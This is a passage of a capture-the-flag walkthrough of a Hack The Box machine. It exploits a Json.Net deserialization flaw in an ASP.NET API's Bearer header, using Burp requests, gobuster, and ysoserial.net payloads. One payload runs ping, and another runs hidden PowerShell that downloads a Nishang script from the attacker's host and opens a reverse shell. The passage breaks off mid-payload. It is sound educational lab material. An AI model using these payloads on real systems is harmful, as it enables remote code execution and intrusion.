</code></pre></td></tr></table>
</div>
</div><p>Connecting Burp-Suite, We can intercept the Login HTTP request, click Action: Send to repeater</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">POST /api/token HTTP/1.1
Host: 10.10.10.158
User-Agent: Mozilla/5.0 <span style="color:#ff79c6">(</span>Macintosh; Intel Mac OS X 10.15; rv:72.0<span style="color:#ff79c6">)</span> Gecko/20100101 Firefox/72.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;<span style="color:#8be9fd;font-style:italic">q</span><span style="color:#ff79c6">=</span>0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;<span style="color:#8be9fd;font-style:italic">charset</span><span style="color:#ff79c6">=</span>utf-8
Content-Length: <span style="color:#bd93f9">39</span>
Origin: http://10.10.10.158
Connection: close
Referer: http://10.10.10.158/login.html

<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;UserName&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span>,<span style="color:#f1fa8c">&#34;Password&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span><span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>We have now the answer which contains a cookie</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">HTTP/1.1 <span style="color:#bd93f9">202</span> Accepted
Cache-Control: no-cache
Pragma: no-cache
Expires: -1
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
Set-Cookie: <span style="color:#8be9fd;font-style:italic">OAuth2</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0</span><span style="color:#ff79c6">=</span>; <span style="color:#8be9fd;font-style:italic">expires</span><span style="color:#ff79c6">=</span>Sun, 16-Feb-2020 14:41:24 GMT; <span style="color:#8be9fd;font-style:italic">path</span><span style="color:#ff79c6">=</span>/
X-Powered-By: ASP.NET
Date: Sun, <span style="color:#bd93f9">16</span> Feb <span style="color:#bd93f9">2020</span> 14:39:24 GMT
Connection: close
Content-Length: <span style="color:#bd93f9">0</span>

<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;Id&#34;</span>:1,<span style="color:#f1fa8c">&#34;UserName&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span>,<span style="color:#f1fa8c">&#34;Password&#34;</span>:<span style="color:#f1fa8c">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span>,<span style="color:#f1fa8c">&#34;Name&#34;</span>:<span style="color:#f1fa8c">&#34;User Admin HTB&#34;</span>,<span style="color:#f1fa8c">&#34;Rol&#34;</span>:<span style="color:#f1fa8c">&#34;Administrator&#34;</span><span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>We are not successful to find additional sweet links</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json$ ../gobuster/gobuster dir --wordlist /opt/dictionaries/common.txt -o gobuster.log -u http://10.10.10.158/
</code></pre></td></tr></table>
</div>
</div><p>No result, but we notice our HTTP POST is sent to /api/token (easier to spot from burp-suite Target tab)</p>
<p>We can try gobuster again with <code>-u http://..../api</code> in an attempt to discover more api links. A good resources is SecList</p>
<blockquote>
<p>git clone <a href="https://github.com/danielmiessler/SecLists.git">https://github.com/danielmiessler/SecLists.git</a></p>
</blockquote>
<p>Let&rsquo;s type /api/Account on Firefox and compare against the capture on Burp we made at login:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">GET</span> /api/Account/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> 10.10.10.158
User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept<span style="color:#ff79c6">:</span> application/json, text/plain, */*
Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
Bearer<span style="color:#ff79c6">:</span> eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
Connection<span style="color:#ff79c6">:</span> close
Referer<span style="color:#ff79c6">:</span> http://10.10.10.158/index.html
Cookie<span style="color:#ff79c6">:</span> OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=

HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sun, 16 Feb 2020 14:37:02 GMT
Connection: close
Content-Length: 119

{&#34;Id&#34;:1,&#34;UserName&#34;:&#34;admin&#34;,&#34;Password&#34;:&#34;21232f297a57a5a743894a0e4a801fc3&#34;,&#34;Name&#34;:&#34;User Admin HTB&#34;,&#34;Rol&#34;:&#34;Administrator&#34;}
</code></pre></td></tr></table>
</div>
</div><p>21232f297a57a5a743894a0e4a801fc3 happens to be the md5sum of the password which is admin</p>
<p>The only difference is the absence of the bearer which happens to be part of SWAGGER.
An interesting observation is that the Bearer is identical to the OAuth2 base64 encoded json-string</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">GET</span> /api/Account/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> 10.10.10.158
User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept<span style="color:#ff79c6">:</span> application/json, text/plain, */*
Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
Connection<span style="color:#ff79c6">:</span> close
Referer<span style="color:#ff79c6">:</span> http://10.10.10.158/index.html
Cookie<span style="color:#ff79c6">:</span> OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=

HTTP/1.1 401 Unauthorized
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sun, 16 Feb 2020 15:18:37 GMT
Connection: close
Content-Length: 61

{&#34;Message&#34;:&#34;Authorization has been denied for this request.&#34;}
</code></pre></td></tr></table>
</div>
</div><p>On modifying the Bearer within Burp Repeater with <code> Bearer: sec fluctuat nec mergitur</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span> <span style="color:#bd93f9">500</span> Internal Server Error
Cache-Control<span style="color:#ff79c6">:</span> no-cache
Pragma<span style="color:#ff79c6">:</span> no-cache
Content-Type<span style="color:#ff79c6">:</span> application/json; charset=utf-8
Expires<span style="color:#ff79c6">:</span> -1
Server<span style="color:#ff79c6">:</span> Microsoft-IIS/8.5
X-AspNet-Version<span style="color:#ff79c6">:</span> 4.0.30319
X-Powered-By<span style="color:#ff79c6">:</span> ASP.NET
Date<span style="color:#ff79c6">:</span> Sun, 16 Feb 2020 15:44:05 GMT
Connection<span style="color:#ff79c6">:</span> close
Content-Length<span style="color:#ff79c6">:</span> 132

{<span style="color:#ff79c6">&#34;Message&#34;</span>:<span style="color:#f1fa8c">&#34;An error has occurred.&#34;</span>,<span style="color:#ff79c6">&#34;ExceptionMessage&#34;</span>:<span style="color:#f1fa8c">&#34;Invalid format base64&#34;</span>,<span style="color:#ff79c6">&#34;ExceptionType&#34;</span>:<span style="color:#f1fa8c">&#34;System.Exception&#34;</span>,<span style="color:#ff79c6">&#34;StackTrace&#34;</span>:<span style="color:#ff79c6">null</span>}
</code></pre></td></tr></table>
</div>
</div><p>Changing the Bearer with base64; Server will ask for json format</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Bearer: bd049f221af82804c5a2826809337c9b
<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;Message&#34;</span>:<span style="color:#f1fa8c">&#34;An error has occurred.&#34;</span>,<span style="color:#f1fa8c">&#34;ExceptionMessage&#34;</span>:<span style="color:#f1fa8c">&#34;Cannot deserialize Json.Net Object&#34;</span>,<span style="color:#f1fa8c">&#34;ExceptionType&#34;</span>:<span style="color:#f1fa8c">&#34;System.Exception&#34;</span>,<span style="color:#f1fa8c">&#34;StackTrace&#34;</span>:null<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Site running ASP, we may be able to exploit Json.Net Deserialization Object.
We come up with this resource <a href="https://github.com/pwntester/ysoserial.net.git">Deserialization payload generator for a variety of .NET formatters </a></p>
<h1 id="weaponization">Weaponization</h1>
<p>We create a payload that ping our machine and we start <code>tcpdump -i utun4 icmp</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">COMMANDO VM
PS C:<span style="color:#f1fa8c">\.</span>..<span style="color:#f1fa8c">\y</span>soserial<span style="color:#f1fa8c">\b</span>in<span style="color:#f1fa8c">\R</span>elease &gt; .<span style="color:#f1fa8c">\y</span>soserial.exe -g ObjectDataProvider -f Json.Net -c <span style="color:#f1fa8c">&#34;ping -n 1 10.10.14.79&#34;</span> -o base64
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMSAxMC4xMC4xNC43OSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9

~/Downloads » sudo tcpdump -i utun4 icmp
Password:
tcpdump: verbose output suppressed, use -v or -vv <span style="color:#ff79c6">for</span> full protocol decode
listening on utun4, link-type NULL <span style="color:#ff79c6">(</span>BSD loopback<span style="color:#ff79c6">)</span>, capture size <span style="color:#bd93f9">262144</span> bytes
12:25:52.573821 IP 10.10.10.158 &gt; 10.10.14.79: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 1, seq 27, length <span style="color:#bd93f9">40</span>
12:25:52.573860 IP 10.10.14.79 &gt; 10.10.10.158: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 1, seq 27, length <span style="color:#bd93f9">40</span>
^C
<span style="color:#bd93f9">2</span> packets captured
</code></pre></td></tr></table>
</div>
</div><p>Alternatively, if you don&rsquo;t have visual studio or microsoft windows host to compile; instead of spinning-up a windows VM, we can copy the example on the git hub README.md and replace <code>/ccalc</code> with a powershell script loading a <a href="https://github.com/samratashok/nishang.git">Nishang Powershell Script</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">{</span>
    <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$type</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#f1fa8c">&#34;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span>,
    <span style="color:#f1fa8c">&#34;MethodName&#34;</span>:<span style="color:#f1fa8c">&#34;Start&#34;</span>,
    <span style="color:#f1fa8c">&#34;MethodParameters&#34;</span>:<span style="color:#ff79c6">{</span>
         <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$type</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#f1fa8c">&#34;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;</span>,
        <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$values</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;cmd&#34;</span>,<span style="color:#f1fa8c">&#34;/cpowershell  -w hidden -noni -nop -c \&#34;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.15.176:8080/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.176 -Port 8000\&#34;&#34;</span><span style="color:#ff79c6">]</span>
    <span style="color:#ff79c6">}</span>,
    <span style="color:#f1fa8c">&#34;ObjectInstance&#34;</span>:<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$type</span><span style="color:#f1fa8c">&#34;</span>:<span style="color:#f1fa8c">&#34;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;</span><span style="color:#ff79c6">}</span>
